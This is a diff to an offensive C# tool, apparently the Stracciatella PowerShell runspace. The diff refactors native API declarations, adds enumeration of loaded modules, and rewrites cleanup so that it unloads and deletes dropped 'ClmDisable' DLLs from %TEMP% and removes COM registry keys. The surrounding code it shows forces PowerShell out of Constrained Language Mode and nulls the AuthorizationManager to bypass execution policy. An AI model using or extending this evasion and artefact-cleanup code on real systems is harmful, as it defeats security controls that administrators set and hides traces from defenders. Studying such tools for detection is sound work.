@@ -9,6 +9,8 @@ using System.Security.Principal;
 using System.Text;
 using System.Threading.Tasks;
 using System.Management.Automation.Runspaces;
+using System.Runtime.InteropServices;
+using System.Diagnostics;
 
 namespace Stracciatella
 {
@@ -24,15 +26,93 @@ namespace Stracciatella
         private static string OUTPUT_CLMDISABLEASSEMBLY_PATH = @"%TEMP%\ClmDisableAssembly.dll";
         private static string OUTPUT_CLMDISABLEDLL_PATH = @"%TEMP%\ClmDisableDll.dll";
 
+        private static List<Module> CollectModules(Process process)
+        {
+            List<Module> collectedModules = new List<Module>();
 
-        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
-        static extern int GetCurrentThreadId();
+            IntPtr[] modulePointers = new IntPtr[0];
+            int bytesNeeded = 0;
 
-        [System.Runtime.InteropServices.DllImport("kernel32.dll", CharSet = System.Runtime.InteropServices.CharSet.Unicode)]
-        private static extern bool FreeLibrary(IntPtr hModule);
+            // Determine number of modules
+            if (!Native.EnumProcessModulesEx(process.Handle, modulePointers, 0, out bytesNeeded, (uint)Native.ModuleFilter.ListModulesAll))
+            {
+                return collectedModules;
+            }
 
-        [System.Runtime.InteropServices.DllImport("kernel32.dll", CharSet = System.Runtime.InteropServices.CharSet.Unicode)]
-        private static extern IntPtr GetModuleHandleW(string moduleName);
+            int totalNumberofModules = bytesNeeded / IntPtr.Size;
+            modulePointers = new IntPtr[totalNumberofModules];
+
+            // Collect modules from the process
+            if (Native.EnumProcessModulesEx(process.Handle, modulePointers, bytesNeeded, out bytesNeeded, (uint)Native.ModuleFilter.ListModulesAll))
+            {
+                for (int index = 0; index < totalNumberofModules; index++)
+                {
+                    StringBuilder moduleFilePath = new StringBuilder(1024);
+                    Native.GetModuleFileNameEx(process.Handle, modulePointers[index], moduleFilePath, (uint)(moduleFilePath.Capacity));
+
+                    string moduleName = Path.GetFileName(moduleFilePath.ToString());
+                    Native.ModuleInformation moduleInformation = new Native.ModuleInformation();
+                    Native.GetModuleInformation(process.Handle, modulePointers[index], out moduleInformation, (uint)(IntPtr.Size * (modulePointers.Length)));
+
+                    // Convert to a normalized module and add it to our list
+                    Module module = new Module(moduleName, moduleInformation.lpBaseOfDll, moduleInformation.SizeOfImage);
+                    collectedModules.Add(module);
+                }
+            }
+
+            return collectedModules;
+        }
+ 
+        internal class Native
+        {
+            [StructLayout(LayoutKind.Sequential)]
+            public struct ModuleInformation
+            {
+                public IntPtr lpBaseOfDll;
+                public uint SizeOfImage;
+                public IntPtr EntryPoint;
+            }
+
+            internal enum ModuleFilter
+            {
+                ListModulesDefault = 0x0,
+                ListModules32Bit = 0x01,
+                ListModules64Bit = 0x02,
+                ListModulesAll = 0x03,
+            }
+
+            [DllImport("psapi.dll")]
+            public static extern bool EnumProcessModulesEx(IntPtr hProcess, [MarshalAs(UnmanagedType.LPArray, ArraySubType = UnmanagedType.U4)] [In][Out] IntPtr[] lphModule, int cb, [MarshalAs(UnmanagedType.U4)] out int lpcbNeeded, uint dwFilterFlag);
+
+            [DllImport("psapi.dll")]
+            public static extern uint GetModuleFileNameEx(IntPtr hProcess, IntPtr hModule, [Out] StringBuilder lpBaseName, [In] [MarshalAs(UnmanagedType.U4)] uint nSize);
+
+            [DllImport("psapi.dll", SetLastError = true)]
+            public static extern bool GetModuleInformation(IntPtr hProcess, IntPtr hModule, out ModuleInformation lpmodinfo, uint cb);
+
+            [DllImport("kernel32.dll")]
+            public static extern int GetCurrentThreadId();
+
+            [DllImport("kernel32.dll", SetLastError = true)]
+            public static extern bool FreeLibrary(IntPtr hModule);
+
+            [DllImport("kernel32.dll", CharSet = System.Runtime.InteropServices.CharSet.Auto)]
+            public static extern IntPtr GetModuleHandle(string lpModuleName);
+        }
+
+        internal class Module
+        {
+            public Module(string moduleName, IntPtr baseAddress, uint size)
+            {
+                this.ModuleName = moduleName;
+                this.BaseAddress = baseAddress;
+                this.Size = size;
+            }
+
+            public string ModuleName { get; set; }
+            public IntPtr BaseAddress { get; set; }
+            public uint Size { get; set; }
+        }
 
         private static bool CreateCOM(PowerShell rs, CustomPSHost host, bool deregister = false)
         {
@@ -65,12 +145,12 @@ namespace Stracciatella
             string deregisterCOM = @"
                 $sid = (whoami /user | select-string -Pattern ""(S-1-5[0-9-]+)"" -all | select -ExpandProperty Matches).value;
 
-                New-PSDrive -PSProvider Registry -Name HKU -Root HKEY_USERS;
+                New-PSDrive -PSProvider Registry -Name HKU -Root HKEY_USERS | out-null
                 $key = 'HKU:\{0}_classes\{1}' -f $sid, """ + COM_NAME + @""";
-                Remove-Item -Force -Path $key -Recurse;
+                Remove-Item -Force -Path $key -Recurse | out-null
 
                 $key = 'HKU:\{0}_classes\CLSID\{1}' -f $sid, """ + COM_GUID + @""";
-                Remove-Item -Force -Path $key -Recurse;
+                Remove-Item -Force -Path $key -Recurse | out-null
 ";
             if (deregister)
             {
@@ -124,18 +204,21 @@ namespace Stracciatella
             if (DisableClm.Verbose) Console.WriteLine("[+] Disabling CLM globally.");
             if (DisableClm.Verbose)
             {
-                Console.WriteLine("\tCurrent thread ID (managed/unmanaged): " + System.Threading.Thread.CurrentThread.ManagedThreadId.ToString() + " / " + GetCurrentThreadId().ToString());
+                Console.WriteLine("\tCurrent thread ID (managed/unmanaged): " + System.Threading.Thread.CurrentThread.ManagedThreadId.ToString() + " / " + Native.GetCurrentThreadId().ToString());
             }
 
             try
-            {            
+            {
                 // Switches back to FullLanguage in CLM
-                Runspace.DefaultRunspace.SessionStateProxy.LanguageMode = PSLanguageMode.FullLanguage;
-                Runspace.DefaultRunspace.InitialSessionState.LanguageMode = PSLanguageMode.FullLanguage;
+                if (Runspace.DefaultRunspace != null)
+                {
+                    Runspace.DefaultRunspace.SessionStateProxy.LanguageMode = PSLanguageMode.FullLanguage;
+                    Runspace.DefaultRunspace.InitialSessionState.LanguageMode = PSLanguageMode.FullLanguage;
 
-                // Bypasses PowerShell execution policy
-                Runspace.DefaultRunspace.InitialSessionState.AuthorizationManager = null;
-                ret |= true;
+                    // Bypasses PowerShell execution policy
+                    Runspace.DefaultRunspace.InitialSessionState.AuthorizationManager = null;
+                    ret |= true;
+                }
             }
             catch (Exception e)
             {
@@ -165,33 +248,61 @@ namespace Stracciatella
             return ProperDisable(rs, host);
         }
 
-        public static bool Cleanup(PowerShell rs, CustomPSHost host, bool verb)
+        private static bool UnloadAndDeleteModule(List<Module> modules, string name, string path, bool verb)
         {
-            if(rs != null && host != null) {
-                if (verb) Console.WriteLine("\n[.] Cleaning up CLM disable artefacts...");
-                CreateCOM(rs, host, true);
-            }
-
             try
             {
-                var mod = GetModuleHandleW("ClmDisableAssembly.dll");
-                if(mod != null)
+                var mod = Native.GetModuleHandle(name);
+                if (mod == IntPtr.Zero)
                 {
-                    FreeLibrary(mod);
+                    var proc = modules.Find(x => !String.Equals(x.ModuleName, name, StringComparison.CurrentCultureIgnoreCase));
+                    if (proc != null)
+                    {
+                        mod = proc.BaseAddress;
+                    }
                 }
 
-                mod = GetModuleHandleW("ClmDisableDll.dll");
-                if (mod != null)
+                if (mod != IntPtr.Zero)
                 {
-                    FreeLibrary(mod);
+                    Native.FreeLibrary(mod);
                 }
 
-                File.Delete(Environment.ExpandEnvironmentVariables(OUTPUT_CLMDISABLEASSEMBLY_PATH));
-                File.Delete(Environment.ExpandEnvironmentVariables(OUTPUT_CLMDISABLEDLL_PATH));
+                File.Delete(Environment.ExpandEnvironmentVariables(path));
+                return true;
             }
             catch (Exception e)
             {
-                if (rs != null && host != null)
+                if (!e.ToString().Contains("System.UnauthorizedAccessException"))
+                {
+                    if (verb)
+                    {
+                        Console.WriteLine($"\tRemoving ({name}) failed. Error: {e}");
+                    }
+                }
+
+                return false;
+            }
+        }
+
+        public static bool Cleanup(PowerShell rs, CustomPSHost host, bool verb)
+        {
+            if (rs != null && host != null)
+            {
+                if (verb) Console.WriteLine("\n[.] Cleaning up CLM disable artefacts...");
+                CreateCOM(rs, host, true);
+            }
+            else
+            {
+                bool ret = true;
+                try
+                {
+                    var modules = CollectModules(Process.GetCurrentProcess());
+                    ret &= UnloadAndDeleteModule(modules, "ClmDisableAssembly.dll", OUTPUT_CLMDISABLEASSEMBLY_PATH, verb);
+                    ret &= UnloadAndDeleteModule(modules, "ClmDisableDll.dll", OUTPUT_CLMDISABLEDLL_PATH, verb);
+
+                    if (!ret) throw new Exception("");
+                }
+                catch (Exception e)
                 {
                     if (verb)
                     {
@@ -199,6 +310,8 @@ namespace Stracciatella
                         Console.WriteLine("\tPS> Remove-Item " + Environment.ExpandEnvironmentVariables(OUTPUT_CLMDISABLEASSEMBLY_PATH));
                         Console.WriteLine("\tPS> Remove-Item " + Environment.ExpandEnvironmentVariables(OUTPUT_CLMDISABLEDLL_PATH));
                     }
+
+                    return false;
                 }
             }
 
